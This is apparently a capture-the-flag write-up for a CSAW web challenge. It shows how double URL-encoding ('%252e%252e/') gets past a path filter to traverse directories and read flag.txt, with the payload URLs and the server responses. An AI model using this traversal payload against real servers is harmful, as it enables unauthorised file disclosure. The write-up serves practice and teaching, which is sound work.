# orange v1

The challenge starts with a URL.

**http://web.chal.csaw.io:7311/?path=orange.txt**
```
	i love oranges
```
From the URL, we can guess that this webserver is appending the value of **path** and using it to retrieve text files.

**http://web.chal.csaw.io:7311/?path=** 
```
	Directory listing for /poems/
	burger.txt
	haiku.txt
	orange.txt
	ppp.txt
	the_red_wheelbarrow.txt
```
After inspecting all of these txts, I couldn't find the flag, and figured it must be in some other directory. Since there were no sub-directories, there was nowhere to go but up.

**http://web.chal.csaw.io:7311/?path=../**
```
	WHOA THATS BANNED!!!!
```
Hm, it seems to be doing some kind of filtering to prevent people from looking around.

So I tried encoding it to make it harder to detect.

**http://web.chal.csaw.io:7311/?path=%2e%2e%2f**
```
	WHOA THATS BANNED!!!!
```
Alright, seems like they check for that.

But, did they account for someone double encoding it?

**http://web.chal.csaw.io:7311/?path=%252e%252e/**
```
	Directory listing for /poems/../
    
	.dockerignore
	back.py
	flag.txt
	poems/
	serve.sh
	server.js
```
Apparently they didn't.

Found the location of the flag, now we just have to get it.

**http://web.chal.csaw.io:7311/?path=%252e%252e/flag.txt**
```
	flag{thank_you_based_orange_for_this_ctf_challenge}
```